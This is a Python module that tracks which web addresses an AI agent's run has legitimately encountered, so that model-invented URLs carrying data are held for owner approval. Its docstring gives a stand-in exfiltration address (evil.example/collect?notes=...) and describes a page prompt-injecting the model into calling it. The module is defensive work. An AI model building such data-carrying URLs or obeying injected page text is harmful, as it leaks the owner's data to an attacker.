"""Which web addresses a run has legitimately come across.

A web address can carry data out: `https://evil.example/collect?notes=<your notes>` hands the notes
to whoever runs that server. After a run has read something the owner did not write, a page might
have talked the model into doing exactly that. Checking the *host* does not help (the page that
did the talking lives on that host); checking the *whole address* does: the owner typed it, a page
or a search result linked to it, or a request to it was approved. An address the model made up,
especially one with data in it, is none of those, so the owner is asked first.

Addresses are remembered as short fingerprints, which is all that is needed to compare them.
"""

from __future__ import annotations

import hashlib
import re
from collections.abc import Iterable

import httpx

MAX_PER_TEXT = 2000
"""Addresses taken from one piece of text; a page cannot make the set grow without bound."""

URL_IN_TEXT = re.compile(
    r"https?://(?:[^\s<>\"'`()\[\]{}]|\([^\s<>\"'`()\[\]{}]*\))+", re.IGNORECASE
)
TRAILING = ".,;:!?*_~"


def url_key(raw: str) -> str | None:
    """A fingerprint of an http(s) address that ignores spelling differences which do not change
    where it points (letter case in the host, a default port, the #fragment). None if not a URL."""
    try:
        url = httpx.URL((raw or "").strip())
    except (httpx.InvalidURL, ValueError):
        return None
    if url.scheme not in ("http", "https") or not url.host:
        return None
    port = f":{url.port}" if url.port else ""
    where = f"{url.scheme}://{url.host.lower().rstrip('.')}{port}{url.raw_path.decode('ascii', 'replace')}"
    return hashlib.sha256(where.encode()).hexdigest()[:20]


def find_urls(text: str | None) -> list[str]:
    """The web addresses written in a piece of text (plain or inside markdown links)."""
    found: list[str] = []
    for match in URL_IN_TEXT.finditer(text or ""):
        url = match.group(0).rstrip(TRAILING)
        if url not in found:
            found.append(url)
        if len(found) >= MAX_PER_TEXT:
            break
    return found


def keys_of(urls: Iterable[str]) -> list[str]:
    return [key for url in urls if (key := url_key(url))]
